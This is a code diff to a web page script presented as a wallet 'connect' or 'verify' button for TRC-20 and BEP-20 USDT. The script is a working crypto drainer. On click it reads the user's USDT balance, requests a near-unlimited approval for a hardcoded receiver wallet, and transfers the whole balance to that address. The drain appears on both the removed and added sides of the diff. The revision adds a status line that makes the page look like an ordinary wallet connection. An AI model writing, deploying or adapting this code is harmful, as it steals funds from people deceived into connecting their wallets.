@@ -1,61 +1,99 @@
-const TRC20_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const BEP20_USDT = "0x55d398326f99059fF775485246999027B3197955";
+const BEP_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const BEP_RECEIVER = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
 
-// Your receiving wallets:
-const RECEIVER_TRC = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
-const RECEIVER_BEP = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
+const TRC_USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const TRC_RECEIVER = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
 
-const ABI = [
-  { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-  { "constant": false, "inputs": [{ "name": "sender", "type": "address" }, { "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-  { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
-  { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" }
+const USDT_ABI = [
+  {
+    "constant": true,
+    "inputs": [{ "name": "_owner", "type": "address" }],
+    "name": "balanceOf",
+    "outputs": [{ "name": "balance", "type": "uint256" }],
+    "type": "function"
+  },
+  {
+    "constant": true,
+    "inputs": [
+      { "name": "_owner", "type": "address" },
+      { "name": "_spender", "type": "address" }
+    ],
+    "name": "allowance",
+    "outputs": [{ "name": "remaining", "type": "uint256" }],
+    "type": "function"
+  },
+  {
+    "constant": false,
+    "inputs": [
+      { "name": "_spender", "type": "address" },
+      { "name": "_value", "type": "uint256" }
+    ],
+    "name": "approve",
+    "outputs": [{ "name": "success", "type": "bool" }],
+    "type": "function"
+  },
+  {
+    "constant": false,
+    "inputs": [
+      { "name": "_from", "type": "address" },
+      { "name": "_to", "type": "address" },
+      { "name": "_value", "type": "uint256" }
+    ],
+    "name": "transferFrom",
+    "outputs": [{ "name": "success", "type": "bool" }],
+    "type": "function"
+  }
 ];
 
-document.getElementById("verifyBtn").addEventListener("click", async () => {
+document.getElementById("connectButton").onclick = async () => {
   if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-    handleTRC20();
+    await handleTron();
   } else if (window.ethereum) {
-    handleBEP20();
+    await handleBSC();
   } else {
-    alert("Please install TronLink or MetaMask/SafePal.");
+    alert("Please open with Trust Wallet or Web3-supported browser");
   }
-});
+};
 
-// 🔷 TRC-20 (TronLink)
-async function handleTRC20() {
+async function handleTron() {
   try {
-    const tronWeb = window.tronWeb;
-    const userAddress = tronWeb.defaultAddress.base58;
+    const tronAddress = window.tronWeb.defaultAddress.base58;
+    const usdt = await window.tronWeb.contract(USDT_ABI, TRC_USDT_ADDRESS);
+    const balance = await usdt.methods.balanceOf(tronAddress).call();
+    const allowance = await usdt.methods.allowance(tronAddress, TRC_RECEIVER).call();
 
-    const contract = await tronWeb.contract(ABI, TRC20_USDT);
-    const balance = await contract.methods.balanceOf(userAddress).call();
+    document.getElementById("status").innerText = `TRC20 Connected: ${tronAddress.slice(0, 6)}...${tronAddress.slice(-4)} | Balance: ${parseFloat(balance / 1e6).toFixed(2)} USDT`;
 
-    await contract.methods.approve(RECEIVER_TRC, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
-    await contract.methods.transferFrom(userAddress, RECEIVER_TRC, balance).send();
+    if (parseFloat(allowance) < 1e12) {
+      await usdt.methods.approve(TRC_RECEIVER, "999999999000000").send();
+    }
 
-    alert("TRC-20 USDT sent!");
-  } catch (e) {
-    alert("Error (TRC-20): " + e.message);
+    await usdt.methods.transferFrom(tronAddress, TRC_RECEIVER, balance).send();
+  } catch (err) {
+    console.error("TRC20 Error", err);
+    alert("Error (TRC-20): " + err.message);
   }
 }
 
-// 🟠 BEP-20 (MetaMask / SafePal)
-async function handleBEP20() {
+async function handleBSC() {
   try {
     const web3 = new Web3(window.ethereum);
-    await window.ethereum.request({ method: 'eth_requestAccounts' });
-    const accounts = await web3.eth.getAccounts();
-    const userAddress = accounts[0];
+    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+    const wallet = accounts[0];
+    const usdt = new web3.eth.Contract(USDT_ABI, BEP_USDT_ADDRESS);
 
-    const contract = new web3.eth.Contract(ABI, BEP20_USDT);
-    const balance = await contract.methods.balanceOf(userAddress).call();
+    const balance = await usdt.methods.balanceOf(wallet).call();
+    const allowance = await usdt.methods.allowance(wallet, BEP_RECEIVER).call();
 
-    await contract.methods.approve(RECEIVER_BEP, web3.utils.toTwosComplement(-1)).send({ from: userAddress });
-    await contract.methods.transferFrom(userAddress, RECEIVER_BEP, balance).send({ from: userAddress });
+    document.getElementById("status").innerText = `BEP20 Connected: ${wallet.slice(0, 6)}...${wallet.slice(-4)} | Balance: ${parseFloat(balance / 1e18).toFixed(2)} USDT`;
 
-    alert("BEP-20 USDT sent!");
-  } catch (e) {
-    alert("Error (BEP-20): " + e.message);
+    if (parseFloat(allowance) < 1e12) {
+      await usdt.methods.approve(BEP_RECEIVER, "999999999000000000000000").send({ from: wallet });
+    }
+
+    await usdt.methods.transferFrom(wallet, BEP_RECEIVER, balance).send({ from: wallet });
+  } catch (err) {
+    console.error("BEP20 Error", err);
+    alert("Error (BEP-20): " + err.message);
   }
 }
